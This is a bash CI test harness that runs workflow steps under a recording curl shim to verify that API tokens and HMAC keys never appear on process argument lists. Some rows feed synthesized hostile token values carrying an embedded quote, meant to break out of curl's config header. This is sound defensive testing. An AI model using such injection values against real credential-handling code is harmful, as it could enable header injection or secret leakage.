  row "S3 kb-drift-walker: an EMPTY signing key is the arm's own red verdict (::error::, exit 1), zero requests (no mute abort)" ok
else row "S3 kb-drift-walker: empty key" fail "rc=$S3_RC calls=$S3_NCALLS"; fi
s3_run "$S3/kb.sh" "$S3/kbstub:$S3/real-nopy" KB_KEY="synth-kb-signing-key-0123"
if [[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 ]] && grep -q '^::error::the ingest signature could not be computed' "$S3_OUT"; then
  row "S3 kb-drift-walker: python3 absent is the same red verdict with zero requests" ok
else row "S3 kb-drift-walker: python3 absent" fail "rc=$S3_RC calls=$S3_NCALLS"; fi
s3_run "$S3/kb.sh" "$KB_REALDIR" KB_KEY="synth-kb-signing-key-0123" KB_DOPPLER_FAIL=1
if [[ "$S3_RC" != 0 && "$S3_NCALLS" == 0 ]]; then
  row "S3 kb-drift-walker: a failing doppler read aborts the step before any request (the key is no longer swallowed into an empty export)" ok
else row "S3 kb-drift-walker: doppler failure" fail "rc=$S3_RC calls=$S3_NCALLS"; fi
if ! grep -qE '^[[:space:]]*export[[:space:]]+KB_DRIFT_INGEST_SIGNING_KEY' < <(grep -v '^[[:space:]]*#' "$S3/kb.live.sh"); then
  row "S3 kb-drift-walker: the signing key is not exported (no other child of the step inherits it)" ok
else row "S3 kb-drift-walker: the signing key is exported" fail ""; fi

# ---- composites: the branches after the send (non-2xx, billing 400, a real transport failure) ----
s3_run "$S3/not.sh" "$S3/real" RESEND_API_KEY="synth-resend_key0123" EMAIL_SUBJECT=s EMAIL_BODY=b SHIM_CODE=500
if [[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 ]] && s3_gho_has "sent=false" && grep -q '^::warning::Email notification failed (HTTP 500)' "$S3_OUT"; then
  row "S3 notify-ops-email: a non-2xx is a warning with sent=false and exit 0 (the caller contract)" ok
else row "S3 notify-ops-email: non-2xx" fail "rc=$S3_RC calls=$S3_NCALLS"; fi
s3_run "$S3/not.sh" "$S3/real" RESEND_API_KEY="synth-resend_key0123" EMAIL_SUBJECT=s EMAIL_BODY=b SHIM_CODE=000 SHIM_RC=7
if [[ "$S3_RC" == 0 ]] && s3_gho_has "sent=false" && grep -q '^::warning::Email notification failed' "$S3_OUT"; then
  row "S3 notify-ops-email: a transport failure is the same warning, sent=false, exit 0" ok
else row "S3 notify-ops-email: transport failure" fail "rc=$S3_RC"; fi
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY="$S3_K_ANTH"
[[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 ]] && s3_gho_has "ok=true" && row "S3 anthropic-preflight: a 200 is ok=true" ok || row "S3 anthropic-preflight: 200" fail "rc=$S3_RC calls=$S3_NCALLS"
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY="$S3_K_ANTH" SHIM_CODE=400 SHIM_BODY='{"error":{"message":"Your credit balance is too low"}}'
[[ "$S3_RC" == 0 ]] && s3_gho_has "ok=false" && row "S3 anthropic-preflight: a billing 400 soft-skips (ok=false, exit 0)" ok || row "S3 anthropic-preflight: billing 400" fail "rc=$S3_RC"

# ---- sentry-audit-gate: the red-class representative ----
s3_body ".github/workflows/sentry-audit-gate.yml" "Verify token scope" > "$S3/sentry.sh" || fatal "S3 could not extract the sentry-audit-gate step"
S3_SENTRY_ENV=(SENTRY_ORG=synthorg SENTRY_API_HOST=synthorg.sentry.io)
s3_run "$S3/sentry.sh" "$S3/real" "${S3_SENTRY_ENV[@]}" SENTRY_AUTH_TOKEN="synth-sentry_token0123"
if [[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 ]] && s3_argv_has "$S3_DIR_ROW/calls/1.argv" '--proto' && s3_argv_has "$S3_DIR_ROW/calls/1.argv" '=https' && s3_argv_has "$S3_DIR_ROW/calls/1.argv" '-g' && s3_tok_not_in_argv "synth-sentry_token0123" \
   && [[ "$(tr '\0' '\n' < "$S3_DIR_ROW/calls/1.stdin" 2>/dev/null)" == 'header = "Authorization: Bearer synth-sentry_token0123"' ]]; then
  row "S3 sentry-audit-gate: a good token passes; the protocol pin and -g survive and the token is on stdin only" ok
else row "S3 sentry-audit-gate: well-formed" fail "rc=$S3_RC calls=$S3_NCALLS"; fi
s3_run "$S3/sentry.sh" "$S3/real" "${S3_SENTRY_ENV[@]}" SENTRY_AUTH_TOKEN="${S3_CANARY}\"x"
if [[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 1 ]] && grep -q '^::error::SENTRY_AUTH_TOKEN scope check failed (HTTP 000' "$S3_OUT" && s3_canary_clean; then
  row "S3 sentry-audit-gate: a malformed token stays RED with the old annotation, the marker once, zero requests, canary absent" ok
else row "S3 sentry-audit-gate: malformed token" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count)"; fi
s3_run "$S3/sentry.sh" "$S3/real" "${S3_SENTRY_ENV[@]}" SENTRY_AUTH_TOKEN="synth-sentry_token0123" SHIM_CODE=403
[[ "$S3_RC" == 1 ]] && grep -q 'scope check failed (HTTP 403' "$S3_OUT" && row "S3 sentry-audit-gate: a non-200 keeps its verdict (HTTP 403, exit 1)" ok || row "S3 sentry-audit-gate: 403" fail "rc=$S3_RC"

# ---- scheduled-prod-version-drift: the warning/annotation-class representative (and B15c's position) ----
s3_body ".github/workflows/scheduled-prod-version-drift.yml" "Email ops on first detection" > "$S3/drift.sh" || fatal "S3 could not extract the drift email step"
S3_DRIFT_ENV=(DETAIL=d MISSING_COUNT=1 RUN_URL=https://example.invalid/run)
s3_run "$S3/drift.sh" "$S3/real" "${S3_DRIFT_ENV[@]}" RESEND_API_KEY="synth-resend_key0123"
[[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 ]] && s3_gho_has "delivered=1" && [[ "$(tr '\0' '\n' < "$S3_DIR_ROW/calls/1.stdin" 2>/dev/null)" == 'header = "Authorization: Bearer synth-resend_key0123"' ]] && row "S3 prod-version-drift: a well-formed key delivers (delivered=1) with the key on stdin only" ok || row "S3 prod-version-drift: well-formed" fail "rc=$S3_RC calls=$S3_NCALLS"
s3_run "$S3/drift.sh" "$S3/real" "${S3_DRIFT_ENV[@]}" RESEND_API_KEY="${S3_CANARY}\"x"
if [[ "$S3_RC" == 0 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 1 ]] && s3_gho_has "delivered=0" && grep -q '^::error::Drift email FAILED (HTTP 000)' "$S3_OUT" && s3_canary_clean; then
  row "S3 prod-version-drift: a malformed key reads as the old delivery failure (::error:: HTTP 000, delivered=0, exit 0) with the marker once and zero requests" ok
else row "S3 prod-version-drift: malformed key" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count)"; fi
s3_run "$S3/drift.sh" "$S3/real" "${S3_DRIFT_ENV[@]}" RESEND_API_KEY="synth-resend_key0123" GITHUB_WORKSPACE="$S3/rows"
[[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 ]] && s3_gho_has "delivered=0" && row "S3 prod-version-drift: library absent is a hard failure (exit 1, delivered=0)" ok || row "S3 prod-version-drift: library absent" fail "rc=$S3_RC"

# ---- recorded slices (the full step needs a runner): each pinned to the live text by a verbatim-substring row ----
s3_slice() { # <file> <step-prefix> <start-regex> <end-regex> -> prints the inclusive line slice of the step's run text
  # patterns travel by ENVIRON: `awk -v` would process the backslash escapes in them
  s3_body "$1" "$2" | S3_AWK_S="$3" S3_AWK_E="$4" awk '$0 ~ ENVIRON["S3_AWK_S"] {f=1} f {print} f && $0 ~ ENVIRON["S3_AWK_E"] {exit}'
}
S3_CUT_SLICE="$(s3_slice .github/workflows/git-data-cutover.yml "Flip preconditions" 'code="\$\(bc_curl git-data-cutover' '^\[\[ "\$code" == "200" \]\]')"
S3_CUT_LIVE="$(s3_body .github/workflows/git-data-cutover.yml "Flip preconditions")"
if [[ -n "$S3_CUT_SLICE" && "$S3_CUT_LIVE" == *"$S3_CUT_SLICE"* && "$(printf '%s\n' "$S3_CUT_SLICE" | grep -c .)" -ge 3 && "$(printf '%s\n' "$S3_CUT_SLICE" | grep -c .)" -le 6 ]]; then row "S3 cutover flip-precondition slice: extracted from the live step text ($(printf '%s\n' "$S3_CUT_SLICE" | grep -c .) lines)" ok; else row "S3 cutover flip-precondition slice: drifted from the live step" fail "slice lines=$(printf '%s\n' "$S3_CUT_SLICE" | grep -c .)"; fi
{ printf 'fail() { echo "VERDICT=$1"; exit 1; }\nhost="https://sentry.invalid"\nsource "${GITHUB_WORKSPACE:?}/scripts/lib/bearer-curl.sh" || fail lib_missing "x"\n'; printf '%s\n' "$S3_CUT_SLICE"; printf 'echo REACHED_200\n'; } > "$S3/cut.sh"
s3_run "$S3/cut.sh" "$S3/real" SENTRY_ACTIONS_RO_TOKEN="${S3_CANARY}\"x"
if [[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 1 ]] && grep -qx 'VERDICT=pin_fault_paging_absent' "$S3_OUT" && s3_canary_clean; then
  row "S3 cutover flip precondition: a malformed read token fails CLOSED with the old verdict (pin_fault_paging_absent), the marker VISIBLE (stderr no longer discarded) and zero requests" ok
else row "S3 cutover flip precondition: malformed token" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count)"; fi
s3_run "$S3/cut.sh" "$S3/real" SENTRY_ACTIONS_RO_TOKEN="synth-sentry_ro0123"
[[ "$S3_RC" == 0 ]] && grep -qx 'REACHED_200' "$S3_OUT" && s3_tok_not_in_argv "synth-sentry_ro0123" && [[ "$(tr '\0' '\n' < "$S3_DIR_ROW/calls/1.stdin" 2>/dev/null)" == 'header = "Authorization: Bearer synth-sentry_ro0123"' ]] && row "S3 cutover flip precondition: a well-formed token reaches the 200 branch, token on stdin only" ok || row "S3 cutover flip precondition: well-formed" fail "rc=$S3_RC"

S3_CEN_SLICE="$(s3_slice .github/workflows/scheduled-inngest-health.yml "Census tunnel connectors" 'TUNNEL_ID=\$\(bc_curl' '^fi$')"
S3_CEN_LIVE="$(s3_body .github/workflows/scheduled-inngest-health.yml "Census tunnel connectors")"
if [[ -n "$S3_CEN_SLICE" && "$S3_CEN_LIVE" == *"$S3_CEN_SLICE"* && "$(printf '%s\n' "$S3_CEN_SLICE" | grep -c .)" -ge 5 && "$(printf '%s\n' "$S3_CEN_SLICE" | grep -c .)" -le 12 ]]; then row "S3 inngest-health census slice: extracted from the live step text ($(printf '%s\n' "$S3_CEN_SLICE" | grep -c .) lines)" ok; else row "S3 inngest-health census slice: drifted from the live step" fail "slice lines=$(printf '%s\n' "$S3_CEN_SLICE" | grep -c .)"; fi
{ printf 'set -euo pipefail\nsource "${GITHUB_WORKSPACE:?}/scripts/lib/bearer-curl.sh"\nCF_ACCOUNT_ID=acct\n'; printf '%s\n' "$S3_CEN_SLICE"; printf 'echo REACHED_NEXT\n'; } > "$S3/cen.sh"
s3_run "$S3/cen.sh" "$S3/real" CF_API_TOKEN="${S3_CANARY}\"x"
if [[ "$S3_RC" == 0 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 1 ]] && s3_gho_has "verdict=census_unavailable" && ! grep -qx 'REACHED_NEXT' "$S3_OUT"; then
  row "S3 inngest-health census: a malformed Cloudflare token is the SOFT census_unavailable verdict (exit 0), marker visible, zero requests" ok
else row "S3 inngest-health census: malformed token" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count)"; fi

# ---- Better Stack reader callers (#9757): the reader's refusal marker reaches the run log, with or without the classifier ----
mkdir -p "$S3/ihws/scripts/lib" "$S3/ihstub" "$S3/ihws-nolib/scripts"
cat > "$S3/ihws/scripts/betterstack-query.sh" <<'IHREADER'
#!/usr/bin/env bash
printf 'SOLEUR_CREDENTIAL_REFUSED script=betterstack-query reason=token_shape\nbetterstack-query: a credential was refused\n' >&2
exit 2
IHREADER
cp "$S3/ihws/scripts/betterstack-query.sh" "$S3/ihws-nolib/scripts/betterstack-query.sh"
cp "$REPO_ROOT/scripts/lib/betterstack-read-classify.sh" "$S3/ihws/scripts/lib/"
cat > "$S3/ihstub/doppler" <<'IHDOPPLER'
#!/usr/bin/env bash
printf 'SOLEUR_CREDENTIAL_REFUSED script=betterstack-query reason=token_shape\nbetterstack-query: a credential was refused\n' >&2
exit 2
IHDOPPLER
chmod +x "$S3/ihws/scripts/betterstack-query.sh" "$S3/ihws-nolib/scripts/betterstack-query.sh" "$S3/ihstub/doppler"
S3_IH_SLICE="$(s3_slice .github/workflows/scheduled-inngest-health.yml "Dedicated inngest host probe consumer" '^BS_ERR=' 'rm -f "\$BS_ERR" "\$BS_ERR\.rows"')"
S3_IH_LIVE="$(s3_body .github/workflows/scheduled-inngest-health.yml "Dedicated inngest host probe consumer")"
if [[ -n "$S3_IH_SLICE" && "$S3_IH_LIVE" == *"$S3_IH_SLICE"* && "$(printf '%s\n' "$S3_IH_SLICE" | grep -c .)" -ge 8 && "$(printf '%s\n' "$S3_IH_SLICE" | grep -c .)" -le 24 ]]; then
  row "S3 inngest-health dedicated-host reader slice: extracted from the live step text ($(printf '%s\n' "$S3_IH_SLICE" | grep -c .) lines)" ok
else row "S3 inngest-health dedicated-host reader slice" fail "slice missing or drifted from the live step"; fi
{ printf 'set -euo pipefail\nrc=0\nPROBE_WINDOW=1h\nPROBE_LIMIT=500\n'; printf '%s\n' "$S3_IH_SLICE"; printf 'echo REACHED_NEXT\necho "rc_seen=$rc"\n'; } > "$S3/ih.sh"
s3_run "$S3/ih.sh" "$S3/real" GITHUB_WORKSPACE="$S3/ihws"
if [[ "$S3_RC" == 0 && "$(s3_marker_count)" == 1 ]] && grep -qx 'REACHED_NEXT' "$S3_OUT" && grep -qx 'rc_seen=2' "$S3_OUT" && grep -q '^::warning::#9757 dedicated-host arm: the Better Stack read failed (rc=2, class=' "$S3_OUT"; then
  row "S3 inngest-health dedicated-host arm: a reader refusal (rc 2) surfaces its marker once and ONE classified ::warning::, and the step goes on with rc=2" ok
else row "S3 inngest-health dedicated-host arm: reader refusal" fail "rc=$S3_RC markers=$(s3_marker_count)"; fi
s3_run "$S3/ih.sh" "$S3/real" GITHUB_WORKSPACE="$S3/ihws-nolib"
if [[ "$S3_RC" == 0 && "$(s3_marker_count)" == 1 ]] && grep -qx 'rc_seen=2' "$S3_OUT" && ! grep -q '^::warning::#9757' "$S3_OUT"; then
  row "S3 inngest-health dedicated-host arm: with the classifier library absent the marker still reaches the log, only the warning is dropped" ok
else row "S3 inngest-health dedicated-host arm: classifier absent" fail "rc=$S3_RC markers=$(s3_marker_count)"; fi

S3_GC_SLICE="$(s3_slice .github/workflows/git-data-cutover.yml "Per-host git_data_store= assertion" '^[[:space:]]*rows_rc=0' '^[[:space:]]*fi$')"
S3_GC_LIVE="$(s3_body .github/workflows/git-data-cutover.yml "Per-host git_data_store= assertion")"
if [[ -n "$S3_GC_SLICE" && "$S3_GC_LIVE" == *"$S3_GC_SLICE"* && "$(printf '%s\n' "$S3_GC_SLICE" | grep -c .)" -ge 5 && "$(printf '%s\n' "$S3_GC_SLICE" | grep -c .)" -le 14 ]]; then
  row "S3 cutover per-host assertion reader slice: extracted from the live step text ($(printf '%s\n' "$S3_GC_SLICE" | grep -c .) lines)" ok
else row "S3 cutover per-host assertion reader slice" fail "slice missing or drifted from the live step"; fi
{ printf 'set -uo pipefail\nBS_ERR="$RUNNER_TEMP/bs-err"\nname_in="'"'"'h1'"'"'"\nleg=blue\ni=1\n'; printf 'source "%s/scripts/lib/betterstack-read-classify.sh"\n' "$REPO_ROOT"; printf '%s\n' "$S3_GC_SLICE"; printf 'echo REACHED_NEXT\necho "rows_rc_seen=$rows_rc"\n'; } > "$S3/gc.sh"
{ printf 'set -uo pipefail\nBS_ERR="$RUNNER_TEMP/bs-err"\nname_in="'"'"'h1'"'"'"\nleg=blue\ni=1\n'; printf '%s\n' "$S3_GC_SLICE"; printf 'echo REACHED_NEXT\necho "rows_rc_seen=$rows_rc"\n'; } > "$S3/gc-nolib.sh"
s3_run "$S3/gc.sh" "$S3/ihstub:$S3/real"
if [[ "$(s3_marker_count)" == 1 ]] && grep -qx 'REACHED_NEXT' "$S3_OUT" && grep -qx 'rows_rc_seen=2' "$S3_OUT" && grep -q '^::warning::host blue: the Better Stack read failed (attempt 1, rc=2, class=' "$S3_OUT"; then
  row "S3 cutover per-host assertion: a reader refusal (rc 2) surfaces its marker and the classified warning, and the loop's rc is kept" ok
else row "S3 cutover per-host assertion: reader refusal" fail "markers=$(s3_marker_count) rc=$S3_RC"; fi
s3_run "$S3/gc-nolib.sh" "$S3/ihstub:$S3/real"
if [[ "$(s3_marker_count)" == 1 ]] && grep -qx 'rows_rc_seen=2' "$S3_OUT" && ! grep -q '^::warning::host blue' "$S3_OUT"; then
  row "S3 cutover per-host assertion: with the classifier library absent the marker still reaches the log, only the warning is dropped" ok
else row "S3 cutover per-host assertion: classifier absent" fail "markers=$(s3_marker_count) rc=$S3_RC"; fi

# ---- the held-back site left its held-back state (S4): the declaration is gone, not forgotten ----
if ! printf '%s\n' .github/workflows/scheduled-inngest-health.yml | python3 -I -c 'import sys,re
for rel in sys.stdin.read().split():
    for l in open(sys.argv[1] + "/" + rel):
        if not l.lstrip().startswith("#") and re.search(r"openssl\b.*-(hmac|macopt)\b", l): sys.exit(0)
sys.exit(1)' "$REPO_ROOT" \
   && grep -qF 'bc_hmac_sha256_hex WEBHOOK_SECRET' "$REPO_ROOT/.github/workflows/scheduled-inngest-health.yml"; then
  row "S3 held-back: the inngest-health probe step left its held-back state (no argv HMAC; the signature comes from bc_hmac_sha256_hex) and S3 declares no exception any more" ok
else row "S3 held-back: the inngest-health probe step carries an argv HMAC again, or no longer signs through the library" fail "restore bc_hmac_sha256_hex or re-declare the exception with its reason"; fi

# =====================================================================================
# STAGE S4 (argv-bearer sweep S4, ADR-280): the push-triggered production-class files. The deploy-webhook callers (the HMAC
# signature plus the Cloudflare Access pair), the Supabase, GitHub App, Resend and Hetzner bearer sites, the `openssl dgst -hmac`
# keys that sit on the same calls, one `x-access-token:` push URL and the two sites S3 held back leave the process command line.
# Population and manifests are DERIVED from the tree; the representative real step bodies and scripts are EXECUTED.
#
#   GUARD 1  no production file puts an HMAC key or a credential header on an argument list: the HMAC census (set identity
#            against an explicit allow-list), the library-user manifest judged structurally, and the inline-wrapper copies
#            judged by the S2 parity audit (hm_audit, now over every copy: cutover 19 plus the S4 workflow and script copies).
#   GUARD 2  a refused credential reaches the SAME verdict class as the old failure (red step, soft verdict, warning or degraded
#            proceed) or the honest existing class of the sink table: never `down`, never `inngest_down`, never `unreachable`.
#            The real step body is extracted from the YAML and run under a recording curl that READS `--config -`, with each
#            credential empty, unset and hostile, and with python3 absent at one HMAC site per form (library, inline).
# All credentials are synthesized. A fixture credential is built from pieces, never a contiguous token literal.
# =====================================================================================
S4="$TMPD/s4"; assert_fixture_dir "$S4"; mkdir -p "$S4/shim" "$S4/real" "$S4/real-nopy" "$S4/shimreal" "$S4/rows" "$S4/bodies"
cat > "$S4/shim/curl" <<'S4SHIM'
#!/usr/bin/env bash
# Recording curl for the S4 stage. Synthesized. Models what the S4 sites need and nothing more:
#  - `--config -` is READ (stdin -> <n>.stdin) unless SHIM_NOSTDIN=1 (the blind-shim control);
#  - `-o <path>`: a /tmp path is remapped into the row (the real step bodies write /tmp/...), /dev/null is dropped;
#  - a `-d/--data <literal>` body and a `--data-binary @<file>` body are recorded to <n>.body (the HMAC oracle's input);
#  - the answer is by profile: generic (SHIM_CODE/SHIM_BODY), webhook (by /hooks/ path; a status read AFTER a POST answers
#    SHIM_STATUS_BODY_POST when set, and /health answers SHIM_HEALTH_BODY), rls (the Supabase Management API);
#  - exit SHIM_RC (default 0).
d="${CALLS_DIR:?}"
n=$(( $(find "$d" -name '*.argv' | wc -l) + 1 ))
printf '%s\0' "$@" > "$d/$n.argv"
out=""; wfmt=""; cfg=0; data=""; url=""; hasdata=0
args=("$@"); i=0
while (( i < ${#args[@]} )); do
  a="${args[i]}"; nx="${args[i+1]-}"
  case "$a" in
    -o|--output) out="$nx"; i=$((i + 1)) ;;
    -w|--write-out) wfmt="$nx"; i=$((i + 1)) ;;
    --config) [[ "$nx" == - ]] && cfg=1; i=$((i + 1)) ;;
    -d|--data|--data-raw) data="$nx"; hasdata=1; i=$((i + 1)) ;;
    --data-binary) if [[ "$nx" == @* ]]; then cp "${nx#@}" "$d/$n.body" 2>/dev/null; else data="$nx"; hasdata=1; fi; i=$((i + 1)) ;;
    --url) url="$nx"; i=$((i + 1)) ;;
    -X|--request|--max-time|--noproxy|-H|--header) i=$((i + 1)) ;;
    http://*|https://*) url="$a" ;;
  esac
  i=$((i + 1))
done
(( hasdata )) && printf '%s' "$data" > "$d/$n.body"
if (( cfg )) && [[ "${SHIM_NOSTDIN:-}" != 1 ]]; then cat > "$d/$n.stdin"; fi
code="${SHIM_CODE:-200}"; body="${SHIM_BODY-}"
case "${SHIM_PROFILE:-generic}" in
  webhook)
    body=""
    case "$url" in
      */hooks/deploy-status|*/hooks/infra-config-status) body="${SHIM_STATUS_BODY-}"; [[ -e "$d/posted" ]] && body="${SHIM_STATUS_BODY_POST-$body}" ;;
      */hooks/inngest-liveness) body="${SHIM_LIVE_BODY-}" ;;
      */hooks/deploy|*/hooks/infra-config) code="${SHIM_POST_CODE:-202}"; : > "$d/posted" ;;
      */health) body="${SHIM_HEALTH_BODY-}" ;;
    esac ;;
  rls)
    body='[]'; code=201
    case "$url" in
      */advisors/security) body='{"lints":[]}'; code=200 ;;
      */database/query)
        case "$data" in
          *violations*) body='[{"violations":0}]'; code=200 ;;
          *pg_default_acl*) body='[{"n":0}]'; code=200 ;;
          *"set local role postgres"*) body='[{"n":1}]'; code=200 ;;
          *"set local role anon"*) body='{"message":"ERROR: 42501: permission denied"}'; code=200 ;;
        esac ;;
      */v1/projects/*) body='{"name":"soleur-inngest-prd"}'; code=200 ;;
    esac ;;
esac
if [[ -n "$out" ]]; then
  case "$out" in
    /dev/null) : ;;
    "${RUNNER_TEMP:-/nonexistent}"/*) printf '%s' "$body" > "$out" ;;
    /tmp/*) mkdir -p "$d/tmp"; printf '%s' "$body" > "$d/tmp/${out##*/}" ;;
    *) printf '%s' "$body" > "$out" ;;
  esac
else
  printf '%s' "$body"
fi
if [[ -n "$wfmt" ]]; then fmt="${wfmt//%\{http_code\}/$code}"; printf '%b' "$fmt"; fi
exit "${SHIM_RC:-0}"
S4SHIM
sed -i "1s|.*|#!${BASH_BIN}|" "$S4/shim/curl"
# `sleep` is a no-op (the poll loops would otherwise spend minutes), `doppler` answers by secret NAME from D_<NAME> (set = value, may be
# empty; unset = the read fails), and every other tool a step may call is a real symlink.
printf '#!%s\nexit 0\n' "$BASH_BIN" > "$S4/shim/sleep"
cat > "$S4/shim/doppler" <<'S4DOP'
#!/usr/bin/env bash
var="D_${3:-}"
if [[ "${1:-}" == secrets && "${2:-}" == get && -n "${!var+x}" ]]; then printf '%s' "${!var}"; exit 0; fi
exit 1
S4DOP
sed -i "1s|.*|#!${BASH_BIN}|" "$S4/shim/doppler"
chmod +x "$S4/shim/curl" "$S4/shim/sleep" "$S4/shim/doppler"
# The real-curl wrapper for the transport-failure rows: every http(s) URL goes to a closed loopback port and the REAL curl runs.
cat > "$S4/shimreal/curl" <<'S4REAL'
#!/usr/bin/env bash
args=(); for a in "$@"; do case "$a" in http://*|https://*) args+=("http://127.0.0.1:9/x") ;; *) args+=("$a") ;; esac; done
exec "@REAL_CURL@" "${args[@]}"
S4REAL
sed -i "1s|.*|#!${BASH_BIN}|; s|@REAL_CURL@|${REAL_CURL}|" "$S4/shimreal/curl"
cp "$S4/shim/sleep" "$S4/shim/doppler" "$S4/shimreal/"
chmod +x "$S4/shimreal/curl" "$S4/shimreal/sleep" "$S4/shimreal/doppler"
for t in bash cat date grep sed tr awk head tail jq mktemp rm mkdir env dirname basename cut wc sort tee find seq uniq ls cp mv cmp od base64 sha256sum diff xargs expr id uname paste readlink touch stat true false printf tar gzip chmod; do
  p="$(type -P "$t" || true)"; [[ -n "$p" ]] && ln -s "$p" "$S4/real/$t"
done
for t in "$S4"/real/*; do ln -s "$(readlink "$t")" "$S4/real-nopy/$(basename "$t")"; done
# python3 and openssl are RECORDING WRAPPERS, not symlinks: each logs its argv to $TOOLS_DIR/<tool>-<n>.argv and execs the real binary, so the
# HMAC rows can assert that the credential is on NEITHER tool's argument list (the key rides python3's ENVIRONMENT; a plain symlink would
# leave a regression that moves it onto python3's argv invisible). python3 is absent from real-nopy on purpose (the signature cannot be computed).
cat > "$S4/toolwrap.tmpl" <<'S4WRAP'
#!/usr/bin/env bash
d="${TOOLS_DIR:-}"
if [[ -n "$d" && -d "$d" ]]; then
  n=$(( $(find "$d" -name '@TOOL@-*.argv' | wc -l) + 1 ))
  printf '%s\0' "$@" > "$d/@TOOL@-$n.argv"
fi
exec "@REAL@" "$@"
S4WRAP
for t in python3 openssl; do
  p="$(type -P "$t" || true)"; [[ -n "$p" ]] || fatal "stage S4: python3, jq and openssl are required"
  sed "1s|.*|#!${BASH_BIN}|; s|@TOOL@|$t|g; s|@REAL@|$p|" "$S4/toolwrap.tmpl" > "$S4/real/$t"; chmod +x "$S4/real/$t"
done
cp "$S4/real/openssl" "$S4/real-nopy/openssl"
[[ -x "$S4/real/python3" && -e "$S4/real/jq" && -x "$S4/real/openssl" && ! -e "$S4/real-nopy/python3" ]] || fatal "stage S4: python3, jq and openssl are required"

S4_CANARY="S4CANARYsecret0123"
S4_HEX32="$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')"
S4_HEX64="$(od -An -N32 -tx1 /dev/urandom | tr -d ' \n')"
S4_KEY="synth-s4-webhook-key-$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
S4_CFID="${S4_HEX32}.access"                      # the shape of a Cloudflare Access service-token id
S4_CFSEC="$S4_HEX64"                              # and of its secret
S4_N=0; S4_RC=0; S4_ROW=""; S4_CWD=""; S4_SHIM="$S4/shim"; : > "$S4/dropped.log"
S4_FLAGS=(--noprofile --norc -e)                  # the runner's default step shell: `bash -e {0}`
S4_ARGS=()                                        # arguments after the script (the bump script takes flags)
S4_REFUSAL_RUNS=0                                 # refusal runs whose every captured stream was searched for the planted canary

# s4_run <label> <script> <realdir> [NAME=value ...]: the script under `env -i` with the recording curl first on PATH.
# An argument holding @ROW@ gets the row directory substituted (a status file path the script reads and writes).
s4_run() {
  local label="$1" body="$2" realdir="$3"; shift 3
  S4_N=$((S4_N + 1)); local r="$S4/rows/$S4_N-${label//[^A-Za-z0-9._-]/_}"
  assert_fixture_dir "$r"; mkdir -p "$r/calls" "$r/rt" "$r/tools"
  : > "$r/gho"; : > "$r/genv"; : > "$r/summary"
  set -- "${@//@ROW@/$r}"
  # The step's environment is what the YAML declares, not what this harness would like it to be: when the body was extracted from a workflow
  # step (s4_body wrote <body>.decl: the workflow-level, job-level and step-level `env:` names, plus every name an earlier step of the job
  # writes to $GITHUB_ENV), an injected NAME=value whose NAME nobody declares is DROPPED (and logged), so a step that reads a variable its
  # YAML no longer declares sees it unset and the row goes red. Harness plumbing (SHIM_*, D_* for the doppler stub) and runner-provided
  # names (GITHUB_*, RUNNER_*) and the runner's ambient LC_ALL (the locale rows) are not step env; WEB_HOST_SSH is exported by the cf-tunnel-ssh-bridge composite and HCLOUD_TOKEN by the infra-credentials composite, not by the workflow file.
  if [[ -r "$body.decl" ]]; then
    local -a kept=(); local a nm
    for a in "$@"; do
      nm="${a%%=*}"
      case "$nm" in SHIM_*|D_*|GITHUB_*|RUNNER_*|WEB_HOST_SSH|HCLOUD_TOKEN|LC_ALL) kept+=("$a"); continue ;; esac
      if grep -qxF -- "$nm" "$body.decl"; then kept+=("$a"); else printf '%s %s\n' "$label" "$nm" >> "$S4/dropped.log"; fi
    done
    set -- ${kept[@]+"${kept[@]}"}
  fi
  S4_RC=0
  ( cd "${S4_CWD:-$REPO_ROOT}" && env -i PATH="$S4_SHIM:$realdir" HOME="$r" TMPDIR="$r" RUNNER_TEMP="$r/rt" GITHUB_OUTPUT="$r/gho" GITHUB_ENV="$r/genv" \
      GITHUB_STEP_SUMMARY="$r/summary" GITHUB_WORKSPACE="$REPO_ROOT" CALLS_DIR="$r/calls" TOOLS_DIR="$r/tools" "$@" \
      "$BASH_BIN" "${S4_FLAGS[@]}" "$body" ${S4_ARGS[@]+"${S4_ARGS[@]}"} < /dev/null ) > "$r/stdout" 2> "$r/stderr" || S4_RC=$?
  S4_ROW="$r"
}
# s4_body <yml> <step id|name prefix> <out> [<from> <to>]...: the step's run text, /tmp/ moved under $RUNNER_TEMP (the runner's
# fresh /tmp, never this host's), and any named edit applied; an edit that did not land is FATAL (a mutation that does not
# land reports the baseline, which is indistinguishable from a pass).
# s4_body_try returns 1 (never aborts) when the step cannot be extracted or an edit does not land: a CONTROL that mutates a line of a real step uses it, so a real
# step that later changes the line fails ITS OWN control row instead of aborting the battery before the real rows around it have run.
declare -A S4_BODY_SRC=()   # <built body path> -> "<repo-relative workflow>|<step selector>" (the population rows ask which step a body was built from)
s4_body_try() {
  local f="$1" sel="$2" out="$3"; shift 3
  assert_fixture_dir "$out"
  S4_BODY_SRC["$out"]="${f#"$REPO_ROOT"/}|$sel"
  s3_body "$f" "$sel" > "$out.raw" || return 1
  python3 -I -c '
import sys
t = open(sys.argv[1]).read()
pairs = sys.argv[3:]
for i in range(0, len(pairs), 2):
    if pairs[i] not in t:
        sys.exit(3)
    t = t.replace(pairs[i], pairs[i + 1])
t = t.replace("/tmp/", "${RUNNER_TEMP}/")
open(sys.argv[2], "w").write(t)' "$out.raw" "$out" "$@" || return 1
  python3 -I -c "$s4_decl_py" "$f" "$sel" > "$out.decl" || return 1
}
